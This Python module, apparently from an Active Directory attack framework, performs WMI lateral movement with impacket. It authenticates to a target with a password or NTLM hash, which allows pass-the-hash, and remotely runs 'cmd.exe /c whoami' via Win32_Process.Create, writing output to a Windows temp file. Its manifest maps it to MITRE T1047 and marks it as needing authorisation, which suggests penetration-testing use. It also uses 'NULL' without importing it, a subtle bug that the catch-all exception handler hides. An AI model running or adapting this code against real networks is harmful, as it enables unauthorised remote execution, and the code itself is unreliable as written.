"""WMI remote execution via impacket."""

from __future__ import annotations

import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.wmi_exec.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["remote_command_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1047"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    if not cred.has_password and not cred.has_hash:
        print("[!] WMI-exec requires credentials", file=sys.stderr)
        return 1

    print(f"[*] WMI-exec → {args.target} ({args.domain}\\{cred.username})")

    try:
        from impacket.dcerpc.v5.dcomrt import DCOMConnection
        from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        dcom = DCOMConnection(
            args.target, cred.username, cred.password or "",
            args.domain, cred.lm_hash, cred.nt_hash,
        )
        iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
        iWbemLevel1Login = IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
        iWbemLevel1Login.RemRelease()

        print(f"[+] WMI connection established to {args.target}")
        print(f"[*] Executing: whoami")

        win32_process, _ = iWbemServices.GetObject("Win32_Process")
        win32_process.Create("cmd.exe /c whoami > C:\\Windows\\Temp\\axf_out.txt", "C:\\", None)
        print("[+] Command executed via WMI")

        dcom.disconnect()
        return 0

    except Exception as exc:
        print(f"[-] WMI-exec failed: {exc}", file=sys.stderr)
        return 1
